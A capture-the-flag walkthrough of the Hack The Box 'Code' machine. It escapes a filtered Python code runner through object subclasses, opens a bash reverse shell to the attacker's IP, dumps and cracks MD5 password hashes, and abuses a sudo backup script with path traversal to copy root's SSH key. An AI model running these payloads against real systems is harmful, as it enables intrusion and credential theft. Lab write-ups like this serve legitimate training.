![Htb Code Card](i/Code.png)

This is a guide for the Code box from Season 7 on [Hack the Box](https://app.hackthebox.com/machines/Code).
We are gonna go from `nobody` to `root`.

### Step 1:
First of all, we are starting with a Nmap scan on the default ports, enumerating versions and services using default scripts.
The results of the scan are the following:

```bash
# Nmap 7.94SVN scan initiated Sat Mar 22 22:33:07 2025 as: nmap -sC -sV -oA nmap/step1 10.129.108.116
Nmap scan report for 10.129.108.116
Host is up (0.068s latency).
Not shown: 998 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.12 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 b5:b9:7c:c4:50:32:95:bc:c2:65:17:df:51:a2:7a:bd (RSA)
|   256 94:b5:25:54:9b:68:af:be:40:e1:1d:a8:6b:85:0d:01 (ECDSA)
|_  256 12:8c:dc:97:ad:86:00:b4:88:e2:29:cf:69:b5:65:96 (ED25519)
5000/tcp open  http    Gunicorn 20.0.4
|_http-server-header: gunicorn/20.0.4
|_http-title: Python Code Editor
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sat Mar 22 22:33:18 2025 -- 1 IP address (1 host up) scanned in 10.17 seconds
```

So, we have 2 ports open, the first service is `SSH` on port 22, and the second one is the `HTTP` service on port 5000.

We are opening the page and we can see that it's just an online Python interpreter, where we can execute Python3 commands and code.

![image.png](i/image.png)

We can also `register`, `login` and see the `about` page through the buttons on the upper right side of the page. I didn't try many things there because I didn't know if it's a rabbit hole or something that would have value, so I left it for later, like a last resort if everything else failed.

Like, true "hackers", we tried to import some libraries and to execute some code. Unfortunately for us, there seems to be some server-side protection with restricted keywords that we cannot use, such as `import` and `open`.
As you can see in the following pictures, the code didn't get executed, and we were caught by the security mechanism.

![image_2025-03-25T15-21-26Z.png](i/image_2025-03-25T15-21-26Z.png)

![image_2025-03-25T15-22-07Z.png](i/image_2025-03-25T15-22-07Z.png)

While exploring and trying different things, I thought of using `globals()`, Pythons' build-in function that returns the dictionary implementing the current module namespace. By calling the function through a `print` statement, we can see that we are getting back very interesting information that we can use, some immediately and some possible later.

![image_2025-03-25T15-34-17Z.png](i/image_2025-03-25T15-34-17Z.png)

`curl` command:
`curl --path-as-is -i -s -k -X $'POST' \
    -H $'Host: 10.129.238.121:5000' -H $'Content-Length: 21' -H $'X-Requested-With: XMLHttpRequest' -H $'Accept-Language: en-US,en;q=0.9' -H $'Accept: */*' -H $'Content-Type: application/x-www-form-urlencoded; charset=UTF-8' -H $'User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36' -H $'Origin: http://10.129.238.121:5000' -H $'Referer: http://10.129.238.121:5000/' -H $'Accept-Encoding: gzip, deflate, br' -H $'Connection: keep-alive' \
    --data-binary $'code=print(globals())' \
    $'http://10.129.238.121:5000/run_code'`

The interesting information that I had to keep in my notes, is the following:

```json
origin='/home/app-production/app/app.py
'db': <SQLAlchemy sqlite:////home/app-production/app/instance/database.db>, 'User': <class 'app.User'>, 'Code': <class 'app.Code'>
'run_code': <function run_code at 0x7fa202956e50>, 'load_code': <function load_code at 0x7fa2027d1040>, 'save_code': <function save_code at 0x7fa2027d11f0\, 'codes': <function codes at 0x7fa2027d13a0>
```

So, what do we have here? Let's analyze the above information in some bullet points.
* There is an `app.py` program (written in Flask), and it's in the `home` directory of the user `app-production`. That's good to know.
* There is a database, that is used by SQLAlchemy (SQLAlchemy is a Python SQL toolkit and Object Relational Mapper that provides developers with the full power and flexibility of SQL1. It supports various databases like SQLite, PostgreSQL, MySQL, Oracle, and MS-SQL2.)
* There are some interesting functions like `run_code`, `load_code` and `save_code`. My first thought was to use the `inspect` library and print the code of these functions, but I had to change my plan because, again, I cannot `import` anything. 

Another approach was to find what subclasses were available, try to manipulate the program, and execute commands to bypass the security mechanism that's in place. To do that I used the following `print` statement:

`print((1).__class__.__bases__[0].__subclasses__())`

![image_2025-03-25T15-57-18Z.png](i/image_2025-03-25T15-57-18Z.png)

`curl` command:
`curl --path-as-is -i -s -k -X $'POST' \
    -H $'Host: 10.129.238.121:5000' -H $'Content-Length: 62' -H $'X-Requested-With: XMLHttpRequest' -H $'Accept-Language: en-US,en;q=0.9' -H $'Accept: */*' -H $'Content-Type: application/x-www-form-urlencoded; charset=UTF-8' -H $'User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36' -H $'Origin: http://10.129.238.121:5000' -H $'Referer: http://10.129.238.121:5000/' -H $'Accept-Encoding: gzip, deflate, br' -H $'Connection: keep-alive' \
    --data-binary $'code=print((1).__class__.__bases__%5B0%5D.__subclasses__())%0A' \
    $'http://10.129.238.121:5000/run_code'`

Breaking the above statement in small parts:
```json
* 1: This is an integer literal.
* .__class__: This attribute returns the class of the integer, which is <class 'int'>.
* .__bases__: This attribute returns a tuple of the base classes (superclasses) of <class 'int'>. For int, the base class is <class 'object'>.
* [0]: This accesses the first element of the tuple returned by .__bases__, which is <class 'object'>. Remember, that was a tuple.
* .__subclasses__(): This method returns a list of all subclasses of <class 'object'>.
* print(...): This function prints the list of subclasses of <class 'object'>.
```

So, the command prints all subclasses of the base `class object` in a list.
Looking line by line at the results of the `print` statement,  I found some interesting subclasses that I would be really happy to use. One of them was `subclasses.Popen`, but I cannot use the word `open`, so that's a problem. However, as I mentioned before, the sublasses are inside a `list`, so if I have the index of the function that I want to use, I can easily pass the arguments through that. Let's find the index of each function, using the code below:

```python
x=(1).__class__.__bases__[0].__subclasses__()
for i,s in enumerate(x):
    print(f"i={i},s={s}",end="\t")
```

That prints the subclasses in the following format: `index` `subclass`. The subclass that is interesting to me has the index `317`.

To see if that works, we can spin up a Python3 simple server using the command `python3 -m http.server` on our machine and use`curl`, for example, to try to connect to that service.

Using the following command
 ` x=(1).__class__.__bases__[0].__subclasses__()[317](["/bin/bash","-c","curl http://10.10.14.145:8000"])`
we can see that we got a hit on our web server.

RCE (Remote Code Execution):

![image_2025-03-25T16-15-59Z.png](i/image_2025-03-25T16-15-59Z.png)

Now, we can change the above  proof-of-concept (POC) code to a reverse shell, create a listener on our machine and wait for the connection to  get established. 

Reverse shell w/ Bash:
`(1).__class__.__bases__[0].__subclasses__()[317](["/bin/bash","-c","bash -i >& /dev/tcp/10.10.14.145/9001 0>&1"])`

![image_2025-03-25T16-24-40Z.png](i/image_2025-03-25T16-24-40Z.png)

### Step 2

Now, we are on the server as the user `app-production` and we can look around to find valuable information. First we can check the `app.py` file that seems to has all the logic of the web application. In the first lines we can see that it's a Flask application that it uses an SQLite database that we knew from before. Also we can see that there is to db models, 

`app.py` - db information:

```python
app = Flask(__name__)                                                                                           
app.config['SECRET_KEY'] = "7j4D5htxLHUiffsjLXB1z9GaZ5"                                                       
app.config['SQLALCHEMY_DATABASE_URI'] = 'sqlite:///database.db'                                                 
app.config['SQLALCHEMY_TRACK_MODIFICATIONS'] = False                                                            
db = SQLAlchemy(app)                                                                                              
class User(db.Model):                                                                                           
    id = db.Column(db.Integer, primary_key=True)                                                                
    username = db.Column(db.String(80), unique=True, nullable=False)                                            
    password = db.Column(db.String(80), nullable=False)                                                         
    codes = db.relationship('Code', backref='user', lazy=True)                                                        
class Code(db.Model):                                                                                           
    id = db.Column(db.Integer, primary_key=True)                                                                
    user_id = db.Column(db.Integer, db.ForeignKey('user.id'), nullable=False)                                   
    code = db.Column(db.Text, nullable=False)                                                                   
    name = db.Column(db.String(100), nullable=False)                                                                                                  
    def __init__(self, user_id, code, name):                                                                    
        self.user_id = user_id                                                                                  
        self.code = code                                                                                        
        self.name = name                                 
```

`app.py` - password information on `/register` (md5 hash):
```python
@app.route('/register', methods=['GET', 'POST'])                                                                
def register():                                                                                                 
    if request.method == 'POST':                                                                                
        username = request.form['username']                                                                     
        password = hashlib.md5(request.form['password'].encode()).hexdigest()                                   
        existing_user = User.query.filter_by(username=username).first()      
```

`app.py` - code execution on `/run_code`:
```python
@app.route('/run_code', methods=['POST'])                                      
def  run_code():                       
    code = request.form['code']                                                
    old_stdout = sys.stdout            
    redirected_output = sys.stdout = io.StringIO()                             
    try:                               
        for keyword in ['eval', 'exec', 'import', 'open', 'os', 'read', 'system', 'write', 'subprocess', '__import__', '__builtins__']:                        
            if keyword in code.lower():                                        
                return jsonify({'output': 'Use of restricted keywords is not allowed.'})                                                                       
        exec(code)                     
        output = redirected_output.getvalue()                                  
    except Exception as e:             
        output = str(e)                
    finally:                           
        sys.stdout = old_stdout                                                
    return jsonify({'output': output})  
```

dumping the database:
```bash
app-production@code:~/app/instance$ sqlite3 database.db
sqlite3 database.db
.database 
main: /home/app-production/app/instance/database.db
.tables
code  user
.dump user
PRAGMA foreign_keys=OFF;
BEGIN TRANSACTION;
CREATE TABLE user (
        id INTEGER NOT NULL, 
        username VARCHAR(80) NOT NULL, 
        password VARCHAR(80) NOT NULL, 
        PRIMARY KEY (id), 
        UNIQUE (username)
);
INSERT INTO user VALUES(1,'development','759b74ce43947f5f4c91aeddc3e5bad3');
INSERT INTO user VALUES(2,'martin','3de6f30c4a09c27fc71932bfc68474be');
COMMIT;
```

Hashcat to the rescue:
```bash
┌─[george@parrot]─[~/htb/lvl1/code]
└──╼ $hashcat -a 0 -m 0 dev.hash ~/SecLists/Passwords/Leaked-Databases/rockyou.txt.tar.gz --show
759b74ce43947f5f4c91aeddc3e5bad3:development

┌─[george@parrot]─[~/htb/lvl1/code]
└──╼ $hashcat -a 0 -m 0 martin.hash ~/SecLists/Passwords/Leaked-Databases/rockyou.txt.tar.gz --show
3de6f30c4a09c27fc71932bfc68474be:nafeelswordsmaster
```

So we can try to SSH with the below credentials:
* development:development
* martin:nafeelswordsmaster

As `martin` on the box:
```bash
martin@code:~/backups$ id
uid=1000(martin) gid=1000(martin) groups=1000(martin)
martin@code:~/backups$ groups
martin
martin@code:~/backups$ sudo -l
Matching Defaults entries for martin on localhost:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User martin may run the following commands on localhost:
    (ALL : ALL) NOPASSWD: /usr/bin/backy.sh

```

`/usr/bin/backy.sh`:
```bash
#!/bin/bash

if [[ $# -ne 1 ]]; then
    /usr/bin/echo "Usage: $0 <task.json>"
    exit 1
fi

json_file="$1"

if [[ ! -f "$json_file" ]]; then
    /usr/bin/echo "Error: File '$json_file' not found."
    exit 1
fi

allowed_paths=("/var/" "/home/")

updated_json=$(/usr/bin/jq '.directories_to_archive |= map(gsub("\\.\\./"; ""))' "$json_file")

/usr/bin/echo "$updated_json" > "$json_file"

directories_to_archive=$(/usr/bin/echo "$updated_json" | /usr/bin/jq -r '.directories_to_archive[]')

is_allowed_path() {
    local path="$1"
    for allowed_path in "${allowed_paths[@]}"; do
        if [[ "$path" == $allowed_path* ]]; then
            return 0
        fi
    done
    return 1
}

for dir in $directories_to_archive; do
    if ! is_allowed_path "$dir"; then
        /usr/bin/echo "Error: $dir is not allowed. Only directories under /var/ and /home/ are allowed."
        exit 1
    fi
done

/usr/bin/backy "$json_file"

```

`task.json`:
```json
martin@code:~/backups$ cat task.json 
{
        "destination": "/home/martin/backups/",
        "multiprocessing": true,
        "verbose_log": false,
        "directories_to_archive": [
                "/home/app-production/app"
        ],

        "exclude": [
                ".*"
        ]
}

```

my `mal.json`:
```json
{
        "destination": "/tmp/",
        "multiprocessing": true,
        "verbose_log": true,
        "directories_to_archive": [
                "/var/....//root/"
        ]
}
```

checking the `tmp` and extracting the files:
```bash
martin@code:/tmp$ ls
code_var_.._root_2025_March.tar.bz2
martin@code:/tmp$ tar -xvjf code_var_.._root_2025_March.tar.bz2 
root/
root/.local/
root/.local/share/
root/.local/share/nano/
root/.local/share/nano/search_history
root/.selected_editor
root/.sqlite_history
root/.profile
root/scripts/
root/scripts/cleanup.sh
root/scripts/backups/
root/scripts/backups/task.json
root/scripts/backups/code_home_app-production_app_2024_August.tar.bz2
root/scripts/database.db
root/scripts/cleanup2.sh
root/.python_history
root/root.txt
root/.cache/
root/.cache/motd.legal-displayed
root/.ssh/
root/.ssh/id_rsa
root/.ssh/authorized_keys
root/.bash_history
root/.bashrc

```

getting the `private key`:
```bash
martin@code:/tmp$ cd root                                                                                       martin@code:/tmp/root$ ls -lah                                                                                  
total 40K                                                                                                       
drwx------ 6 martin martin 4.0K Mar 25 13:10 .                                                                  
drwxrwxrwt 8 root   root   4.0K Mar 25 17:52 ..                                                                 
lrwxrwxrwx 1 martin martin    9 Jul 27  2024 .bash_history -> /dev/null                                         
-rw-r--r-- 1 martin martin 3.1K Dec  5  2019 .bashrc                                                            
drwx------ 2 martin martin 4.0K Aug 27  2024 .cache                                                             
drwxr-xr-x 3 martin martin 4.0K Jul 27  2024 .local                                                             
-rw-r--r-- 1 martin martin  161 Dec  5  2019 .profile                                                           
lrwxrwxrwx 1 martin martin    9 Jul 27  2024 .python_history -> /dev/null
-rw-r--r-- 1 martin martin   66 Jul 29  2024 .selected_editor
lrwxrwxrwx 1 martin martin    9 Jul 27  2024 .sqlite_history -> /dev/null
drwx------ 2 martin martin 4.0K Aug 27  2024 .ssh
-rw-r----- 1 martin martin   33 Mar 25 13:10 root.txt
drwxr-xr-x 3 martin martin 4.0K Sep 16  2024 scripts
martin@code:/tmp/root$ cd .ssh
martin@code:/tmp/root/.ssh$ ls
authorized_keys  id_rsa
martin@code:/tmp/root/.ssh$ cat id_rsa 
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
[...SNIP...]

```

Now we can mod the persmission of the `RSA Key` and login as root:
```bash
┌─[george@parrot]─[~/htb/lvl1/code]                                                                             
└──╼ $chmod 600 id_rsa_root                                                                                     
┌─[george@parrot]─[~/htb/lvl1/code]
└──╼ $ssh -i id_rsa_root root@10.129.238.121                                                                    
Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.4.0-208-generic x86_64)
[...SNIP...]
```

Now we can get all the `flags`.